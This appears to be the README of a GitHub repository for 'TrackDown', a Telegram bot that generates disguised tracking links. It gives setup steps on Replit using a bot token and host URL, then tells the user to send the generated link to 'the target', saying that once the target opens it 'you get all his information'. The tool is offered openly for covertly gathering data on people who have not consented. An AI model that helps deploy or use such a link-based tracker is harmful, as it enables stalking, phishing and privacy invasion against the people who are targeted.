<p align='center'><img style="height:100px;width:100px" src="icon.png" ></p>

<h2 align='center'>Track Down people by just using a link.</h2>

<div align="center">

[![https://t.me/hexada_tech](https://img.shields.io/badge/Telegram-Channel-orange.svg?style=flat-square)](https://t.me/hexada_tech)
[![https://t.me/hexada_tech](https://img.shields.io/badge/Telegram-@hexada_tech-blue.svg?style=flat-square)](https://t.me/hexada_tech)

</div>


### All our Bots in this channel[@hexada_tech_info](https://t.me/hexada_tech_info)


### How to build
1. Create a telegram bot through [BotFather](https://t.me/BotFather).
1. Copy it's API key
1. download this repo as `zip` and extract it to your files 
1. `cd TrackDown`
1.  [open the vps (https://replit.com/)
1. import this 2 files `script.zip` and `index.js`
1. start the `index.js` by click to run 
1. the files should be extracted now 
1. edit hosturl url in `hosturl.txt` put your host url in the txt file and save .
1. Edit `bottoken` and add your bot token and save. 
1. Run `npm install`
1. Afterwards `npm start`
1. Your Bot is now online.
1. Check your bot now in telegram
1. when he asked you about link make sure you sending him this link `https://google.com`
1. Pick the first link he give it to you and send him to the target
1. If he open it game over now you get all his information
